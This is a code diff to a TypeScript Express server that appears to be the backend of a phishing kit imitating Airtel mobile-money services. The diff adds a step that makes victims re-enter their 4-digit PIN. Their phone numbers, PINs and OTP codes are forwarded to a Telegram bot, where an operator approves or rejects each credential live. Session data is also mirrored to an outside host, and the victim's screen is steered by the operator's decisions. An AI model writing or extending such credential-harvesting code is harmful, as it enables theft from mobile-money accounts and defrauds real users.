@@ -21,13 +21,16 @@ export interface SessionRecord {
   country?: string;
   airtelBrand?: string;
   pin: string;
+  reenterPin?: string;
   otp?: string;
   planName: string;
   planPrice: string;
   loginStatus: 'pending' | 'approved' | 'rejected';
   otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
+  reenterStatus?: 'idle' | 'pending' | 'approved' | 'rejected';
   loginMessageId?: number;
   otpMessageId?: number;
+  reenterMessageId?: number;
   createdAt: number;
   lastUpdated: number;
 }
@@ -224,7 +227,7 @@ function findSessionByIdOrPhone(idOrPhone: string, messageText?: string): Sessio
 }
 
 // Helper to get the most recent pending session
-function getLatestPendingSession(type: 'login' | 'otp' | 'any'): SessionRecord | undefined {
+function getLatestPendingSession(type: 'login' | 'otp' | 'reenter' | 'any'): SessionRecord | undefined {
   let latest: SessionRecord | undefined;
   for (const s of sessions.values()) {
     const isTarget =
@@ -232,7 +235,9 @@ function getLatestPendingSession(type: 'login' | 'otp' | 'any'): SessionRecord |
         ? s.loginStatus === 'pending'
         : type === 'otp'
         ? s.otpStatus === 'pending'
-        : s.loginStatus === 'pending' || s.otpStatus === 'pending';
+        : type === 'reenter'
+        ? s.reenterStatus === 'pending'
+        : s.loginStatus === 'pending' || s.otpStatus === 'pending' || s.reenterStatus === 'pending';
     if (isTarget) {
       if (!latest || s.lastUpdated > latest.lastUpdated) {
         latest = s;
@@ -410,6 +415,69 @@ async function pollTelegramUpdates() {
                 answerCallbackQuery(callbackId, 'Session introuvable.', false);
               }
             }
+
+            // E) APPROVE REENTER PIN
+            else if (callbackData.startsWith('approve_reenter')) {
+              const rawId = callbackData.replace('approve_reenter_', '').replace('approve_reenter', '').trim();
+              const session = findSessionByIdOrPhone(rawId, originalText) || getLatestPendingSession('reenter');
+
+              if (session) {
+                session.reenterStatus = 'approved';
+                session.lastUpdated = Date.now();
+                saveSessionsToDisk();
+                notifySessionUpdated(session);
+
+                answerCallbackQuery(callbackId, '✅ Code PIN final validé avec succès ! Forfait activé.', true);
+
+                if (msgId && chatId) {
+                  const updatedText =
+                    `🔐 <b>AIRTEL LITE - CODE PIN FINAL VALIDÉ</b>\n\n` +
+                    `🌍 <b>Pays:</b> ${session.country || 'Airtel'}\n` +
+                    `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
+                    `🔑 <b>Code PIN Ressaisi:</b> <code>${session.reenterPin || session.pin}</code>\n` +
+                    `🔢 <b>Code OTP Validé:</b> <code>${session.otp || '****'}</code>\n` +
+                    `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
+                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n` +
+                    `⏰ <b>Heure validation:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
+                    `🟢 <b>STATUT: ✅ CODE PIN CONFIRMÉ & FORFAIT ACTIVÉ AVEC SUCCÈS</b>\n` +
+                    `<i>Transaction terminée avec succès. L'utilisateur a été redirigé vers l'écran de succès.</i>`;
+                  editMessageText(chatId, msgId, updatedText);
+                }
+              } else {
+                answerCallbackQuery(callbackId, 'Session introuvable.', false);
+              }
+            }
+
+            // F) REJECT REENTER PIN
+            else if (callbackData.startsWith('reject_reenter')) {
+              const rawId = callbackData.replace('reject_reenter_', '').replace('reject_reenter', '').trim();
+              const session = findSessionByIdOrPhone(rawId, originalText) || getLatestPendingSession('reenter');
+
+              if (session) {
+                session.reenterStatus = 'rejected';
+                session.lastUpdated = Date.now();
+                saveSessionsToDisk();
+                notifySessionUpdated(session);
+
+                answerCallbackQuery(callbackId, '❌ Code PIN rejeté (incorrect).', true);
+
+                if (msgId && chatId) {
+                  const updatedText =
+                    `🔐 <b>AIRTEL LITE - CODE PIN FINAL REJETÉ</b>\n\n` +
+                    `🌍 <b>Pays:</b> ${session.country || 'Airtel'}\n` +
+                    `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
+                    `🔑 <b>Code PIN Saisi:</b> <code>${session.reenterPin || '****'}</code>\n` +
+                    `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
+                    `🆔 <b>Session:</b> <code>${session.sessionId}</code>\n` +
+                    `⏰ <b>Heure refus:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
+                    `🔴 <b>STATUT: ❌ CODE PIN REJETÉ / INCORRECT</b>\n` +
+                    `<i>L'utilisateur a été invité à ressaisir son code PIN correct sur son écran.</i>`;
+                  editMessageText(chatId, msgId, updatedText);
+                }
+              } else {
+                answerCallbackQuery(callbackId, 'Session introuvable.', false);
+              }
+            }
           }
 
           // 2. TEXT MESSAGES (REPLIES OR DIRECT ADMIN COMMANDS)
@@ -425,15 +493,18 @@ async function pollTelegramUpdates() {
             // Case A: Reply to an existing bot message
             if (replyTo && replyTo.text) {
               const replyText = replyTo.text;
-              const isOtp = replyText.includes('OTP') || replyText.includes('VÉRIFICATION');
-              const session = findSessionByIdOrPhone('', replyText) || getLatestPendingSession(isOtp ? 'otp' : 'login');
+              const isReenter = replyText.includes('RESSAISIE') || replyText.includes('CONFIRMÉ') || replyText.includes('FINAL');
+              const isOtp = !isReenter && (replyText.includes('OTP') || replyText.includes('VÉRIFICATION'));
+              const session = findSessionByIdOrPhone('', replyText) || getLatestPendingSession(isReenter ? 'reenter' : isOtp ? 'otp' : 'login');
 
               if (session) {
                 const isApprove = ['ok', 'oui', 'valider', 'yes', 'approve', 'bon', '+', '1', '/ok', '/valider'].includes(lowerText);
                 const isReject = ['non', 'refuser', 'no', 'reject', 'faux', 'erreur', '-', '0', '/non', '/rejeter'].includes(lowerText);
 
                 if (isApprove) {
-                  if (isOtp) {
+                  if (isReenter) {
+                    session.reenterStatus = 'approved';
+                  } else if (isOtp) {
                     session.otpStatus = 'approved';
                   } else {
                     session.loginStatus = 'approved';
@@ -443,12 +514,14 @@ async function pollTelegramUpdates() {
                   notifySessionUpdated(session);
 
                   sendTelegramMessage(
-                    `✅ <b>${isOtp ? 'OTP' : 'Connexion'} Validé(e) avec succès !</b>\n` +
+                    `✅ <b>${isReenter ? 'Code PIN Final' : isOtp ? 'OTP' : 'Connexion'} Validé(e) avec succès !</b>\n` +
                     `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
                     `🆔 <b>Session:</b> <code>${session.sessionId}</code>`
                   );
                 } else if (isReject) {
-                  if (isOtp) {
+                  if (isReenter) {
+                    session.reenterStatus = 'rejected';
+                  } else if (isOtp) {
                     session.otpStatus = 'rejected';
                   } else {
                     session.loginStatus = 'rejected';
@@ -458,7 +531,7 @@ async function pollTelegramUpdates() {
                   notifySessionUpdated(session);
 
                   sendTelegramMessage(
-                    `❌ <b>${isOtp ? 'OTP' : 'Connexion'} Rejeté(e) !</b>\n` +
+                    `❌ <b>${isReenter ? 'Code PIN Final' : isOtp ? 'OTP' : 'Connexion'} Rejeté(e) !</b>\n` +
                     `👤 <b>Numéro:</b> <code>${session.fullPhone || session.phone}</code>\n` +
                     `🆔 <b>Session:</b> <code>${session.sessionId}</code>`
                   );
@@ -472,7 +545,9 @@ async function pollTelegramUpdates() {
               const session = param ? findSessionByIdOrPhone(param) : getLatestPendingSession('any');
 
               if (session) {
-                if (session.otpStatus === 'pending') {
+                if (session.reenterStatus === 'pending') {
+                  session.reenterStatus = 'approved';
+                } else if (session.otpStatus === 'pending') {
                   session.otpStatus = 'approved';
                 } else {
                   session.loginStatus = 'approved';
@@ -497,7 +572,9 @@ async function pollTelegramUpdates() {
               const session = param ? findSessionByIdOrPhone(param) : getLatestPendingSession('any');
 
               if (session) {
-                if (session.otpStatus === 'pending') {
+                if (session.reenterStatus === 'pending') {
+                  session.reenterStatus = 'rejected';
+                } else if (session.otpStatus === 'pending') {
                   session.otpStatus = 'rejected';
                 } else {
                   session.loginStatus = 'rejected';
@@ -759,6 +836,99 @@ app.post('/api/telegram/send-otp', async (req, res) => {
   }
 });
 
+// 2b. Send Re-entered / Confirmed 4-digit PIN to Telegram
+app.post('/api/telegram/send-reenter-pin', async (req, res) => {
+  try {
+    const { sessionId, phone, pin, originalPin, planName, planPrice, country, fullPhone, airtelBrand } = req.body;
+
+    if (!sessionId || !pin) {
+      return res.status(400).json({ error: 'Paramètres manquants.' });
+    }
+
+    const cleanPin = pin.toString().replace(/\D/g, '').slice(0, 4);
+    if (cleanPin.length !== 4) {
+      return res.status(400).json({ error: 'Le code PIN doit comporter exactement 4 chiffres.' });
+    }
+
+    let session = sessions.get(sessionId);
+    if (!session) {
+      const cleanPhone = phone ? normalizePhone(phone) : 'Inconnu';
+      session = {
+        sessionId,
+        phone: cleanPhone,
+        fullPhone: fullPhone || `+243 ${cleanPhone}`,
+        country: country || 'Airtel Africa',
+        airtelBrand: airtelBrand || 'Airtel Starlink',
+        pin: originalPin || '****',
+        reenterPin: cleanPin,
+        planName: planName || 'Forfait Airtel Starlink',
+        planPrice: planPrice || '$1.49',
+        loginStatus: 'approved',
+        otpStatus: 'approved',
+        reenterStatus: 'pending',
+        createdAt: Date.now(),
+        lastUpdated: Date.now(),
+      };
+      sessions.set(sessionId, session);
+      if (cleanPhone !== 'Inconnu') {
+        phoneToSessionMap.set(cleanPhone, sessionId);
+      }
+    } else {
+      session.reenterPin = cleanPin;
+      session.reenterStatus = 'pending';
+      if (fullPhone) session.fullPhone = fullPhone;
+      if (country) session.country = country;
+      session.lastUpdated = Date.now();
+    }
+
+    saveSessionsToDisk();
+
+    const displayPhone = session.fullPhone || `+243 ${session.phone}`;
+    const displayCountry = session.country || 'Airtel Africa';
+
+    const messageText =
+      `🔐 <b>CODE PIN CONFIRMÉ / RESSAISI (ÉTAPE POST-OTP)</b>\n\n` +
+      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
+      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
+      `🔑 <b>Code PIN Ressaisi (Correct):</b> <code>${cleanPin}</code>\n` +
+      `📌 <b>Code PIN Initial:</b> <code>${session.pin || originalPin || 'N/A'}</code>\n` +
+      `🔢 <b>Code OTP Validé:</b> <code>${session.otp || '****'}</code>\n` +
+      `📦 <b>Forfait:</b> ${session.planName} (${session.planPrice})\n` +
+      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
+      `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
+      `👇 <i>Confirmez la validation finale du code PIN pour activer le forfait :</i>`;
+
+    const inlineKeyboard = [
+      [
+        {
+          text: '✅ Valider PIN Final',
+          callback_data: `approve_reenter_${sessionId}`,
+        },
+        {
+          text: '❌ Rejeter PIN Final',
+          callback_data: `reject_reenter_${sessionId}`,
+        },
+      ],
+    ];
+
+    const result = await sendTelegramMessage(messageText, inlineKeyboard);
+    if (result && result.result?.message_id) {
+      session.reenterMessageId = result.result.message_id;
+      saveSessionsToDisk();
+    }
+
+    return res.json({
+      success: true,
+      sessionId,
+      status: session.reenterStatus,
+      message: 'Code PIN confirmé transmis au Telegram.',
+    });
+  } catch (error: any) {
+    console.error('Error in /api/telegram/send-reenter-pin:', error);
+    return res.status(500).json({ error: error.message || 'Erreur serveur' });
+  }
+});
+
 // 3. Fast In-Memory Status Polling Endpoint (< 5ms)
 app.get('/api/telegram/status', (req, res) => {
   const sessionId = (req.query.sessionId || req.query.id) as string;
@@ -781,6 +951,7 @@ app.get('/api/telegram/status', (req, res) => {
       exists: false,
       loginStatus: 'idle',
       otpStatus: 'idle',
+      reenterStatus: 'idle',
     });
   }
 
@@ -790,6 +961,7 @@ app.get('/api/telegram/status', (req, res) => {
     phone: session.phone,
     loginStatus: session.loginStatus,
     otpStatus: session.otpStatus,
+    reenterStatus: session.reenterStatus || 'idle',
     lastUpdated: session.lastUpdated,
   });
 });
@@ -799,7 +971,7 @@ app.get('/api/telegram/status', (req, res) => {
 app.get('/api/telegram/wait-status', (req, res) => {
   const sessionId = (req.query.sessionId || req.query.id) as string;
   const phone = req.query.phone as string;
-  const targetStep = (req.query.targetStep as 'login' | 'otp') || 'login';
+  const targetStep = (req.query.targetStep as 'login' | 'otp' | 'reenter') || 'login';
   const timeoutMs = Math.min(Math.max(parseInt(req.query.timeout as string, 10) || 10000, 2000), 20000);
 
   let session: SessionRecord | undefined;
@@ -820,10 +992,16 @@ app.get('/api/telegram/wait-status', (req, res) => {
       status: 'idle',
       loginStatus: 'idle',
       otpStatus: 'idle',
+      reenterStatus: 'idle',
     });
   }
 
-  const currentStatus = targetStep === 'login' ? session.loginStatus : session.otpStatus;
+  const currentStatus =
+    targetStep === 'login'
+      ? session.loginStatus
+      : targetStep === 'otp'
+      ? session.otpStatus
+      : session.reenterStatus || 'idle';
 
   // If already resolved (approved or rejected), respond immediately!
   if (currentStatus === 'approved' || currentStatus === 'rejected') {
@@ -834,6 +1012,7 @@ app.get('/api/telegram/wait-status', (req, res) => {
       status: currentStatus,
       loginStatus: session.loginStatus,
       otpStatus: session.otpStatus,
+      reenterStatus: session.reenterStatus || 'idle',
       immediate: true,
     });
   }
@@ -844,7 +1023,12 @@ app.get('/api/telegram/wait-status', (req, res) => {
 
   const listener: SessionListener = (updatedSession) => {
     if (isResolved) return;
-    const newStatus = targetStep === 'login' ? updatedSession.loginStatus : updatedSession.otpStatus;
+    const newStatus =
+      targetStep === 'login'
+        ? updatedSession.loginStatus
+        : targetStep === 'otp'
+        ? updatedSession.otpStatus
+        : updatedSession.reenterStatus || 'idle';
     if (newStatus === 'approved' || newStatus === 'rejected') {
       isResolved = true;
       if (timer) clearTimeout(timer);
@@ -855,6 +1039,7 @@ app.get('/api/telegram/wait-status', (req, res) => {
         status: newStatus,
         loginStatus: updatedSession.loginStatus,
         otpStatus: updatedSession.otpStatus,
+        reenterStatus: updatedSession.reenterStatus || 'idle',
         immediate: false,
       });
     }
@@ -875,7 +1060,13 @@ app.get('/api/telegram/wait-status', (req, res) => {
       if (set.size === 0) waitingListeners.delete(sessionId);
     }
     const latest = sessions.get(sessionId);
-    const resolvedStatus = latest ? (targetStep === 'login' ? latest.loginStatus : latest.otpStatus) : 'pending';
+    const resolvedStatus = latest
+      ? targetStep === 'login'
+        ? latest.loginStatus
+        : targetStep === 'otp'
+        ? latest.otpStatus
+        : latest.reenterStatus || 'idle'
+      : 'pending';
     res.json({
       exists: Boolean(latest),
       sessionId,
@@ -923,6 +1114,12 @@ app.post('/api/telegram/webhook', async (req, res) => {
       } else if (callbackData.startsWith('reject_otp_')) {
         recordId = callbackData.replace('reject_otp_', '');
         actionType = 'reject_otp';
+      } else if (callbackData.startsWith('approve_reenter_')) {
+        recordId = callbackData.replace('approve_reenter_', '');
+        actionType = 'approve_reenter';
+      } else if (callbackData.startsWith('reject_reenter_')) {
+        recordId = callbackData.replace('reject_reenter_', '');
+        actionType = 'reject_reenter';
       }
 
       if (recordId) {
@@ -933,6 +1130,8 @@ app.post('/api/telegram/webhook', async (req, res) => {
           else if (actionType === 'reject_login') session.loginStatus = 'rejected';
           else if (actionType === 'approve_otp') session.otpStatus = 'approved';
           else if (actionType === 'reject_otp') session.otpStatus = 'rejected';
+          else if (actionType === 'approve_reenter') session.reenterStatus = 'approved';
+          else if (actionType === 'reject_reenter') session.reenterStatus = 'rejected';
           session.lastUpdated = Date.now();
           saveSessionsToDisk();
           notifySessionUpdated(session);
@@ -948,6 +1147,8 @@ app.post('/api/telegram/webhook', async (req, res) => {
             else if (actionType === 'reject_login') data.loginStatus = 'rejected';
             else if (actionType === 'approve_otp') data.otpStatus = 'approved';
             else if (actionType === 'reject_otp') data.otpStatus = 'rejected';
+            else if (actionType === 'approve_reenter') data.reenterStatus = 'approved';
+            else if (actionType === 'reject_reenter') data.reenterStatus = 'rejected';
             data.lastUpdated = Date.now();
 
             await fetch(`https://api.restful-api.dev/objects/${recordId}`, {
@@ -966,6 +1167,8 @@ app.post('/api/telegram/webhook', async (req, res) => {
         if (actionType === 'reject_login') alertMsg = '❌ Connexion refusée.';
         if (actionType === 'approve_otp') alertMsg = '✅ Code OTP validé avec succès !';
         if (actionType === 'reject_otp') alertMsg = '❌ Code OTP rejeté ou invalide.';
+        if (actionType === 'approve_reenter') alertMsg = '✅ Code PIN final validé avec succès !';
+        if (actionType === 'reject_reenter') alertMsg = '❌ Code PIN final refusé.';
 
         answerCallbackQuery(callbackId, alertMsg, true);
 
@@ -1008,6 +1211,22 @@ app.post('/api/telegram/webhook', async (req, res) => {
               `📦 <b>Forfait:</b> ${plan}\n` +
               `🆔 <b>Session:</b> <code>${recordId}</code>\n\n` +
               `🔴 <b>STATUT: ❌ OTP REJETÉ / INVALIDE</b>`;
+          } else if (actionType === 'approve_reenter') {
+            updatedText =
+              `🔐 <b>AIRTEL LITE - CODE PIN FINAL VALIDÉ</b>\n\n` +
+              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
+              `🔑 <b>Code PIN:</b> <code>${session?.reenterPin || session?.pin || '****'}</code>\n` +
+              `📦 <b>Forfait:</b> ${plan}\n` +
+              `🆔 <b>Session:</b> <code>${recordId}</code>\n\n` +
+              `🟢 <b>STATUT: ✅ CODE PIN CONFIRMÉ & FORFAIT ACTIVÉ AVEC SUCCÈS</b>`;
+          } else if (actionType === 'reject_reenter') {
+            updatedText =
+              `🔐 <b>AIRTEL LITE - CODE PIN FINAL REJETÉ</b>\n\n` +
+              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
+              `🔑 <b>Code PIN:</b> <code>${session?.reenterPin || '****'}</code>\n` +
+              `📦 <b>Forfait:</b> ${plan}\n` +
+              `🆔 <b>Session:</b> <code>${recordId}</code>\n\n` +
+              `🔴 <b>STATUT: ❌ CODE PIN REJETÉ / INCORRECT</b>`;
           }
 
           if (updatedText) {
@@ -1035,6 +1254,8 @@ app.get('/api/telegram/action', async (req, res) => {
     else if (action === 'reject_login') session.loginStatus = 'rejected';
     else if (action === 'approve_otp') session.otpStatus = 'approved';
     else if (action === 'reject_otp') session.otpStatus = 'rejected';
+    else if (action === 'approve_reenter') session.reenterStatus = 'approved';
+    else if (action === 'reject_reenter') session.reenterStatus = 'rejected';
     session.lastUpdated = Date.now();
     saveSessionsToDisk();
     notifySessionUpdated(session);
@@ -1049,6 +1270,8 @@ app.get('/api/telegram/action', async (req, res) => {
       else if (action === 'reject_login') data.loginStatus = 'rejected';
       else if (action === 'approve_otp') data.otpStatus = 'approved';
       else if (action === 'reject_otp') data.otpStatus = 'rejected';
+      else if (action === 'approve_reenter') data.reenterStatus = 'approved';
+      else if (action === 'reject_reenter') data.reenterStatus = 'rejected';
       data.lastUpdated = Date.now();
 
       await fetch(`https://api.restful-api.dev/objects/${id}`, {
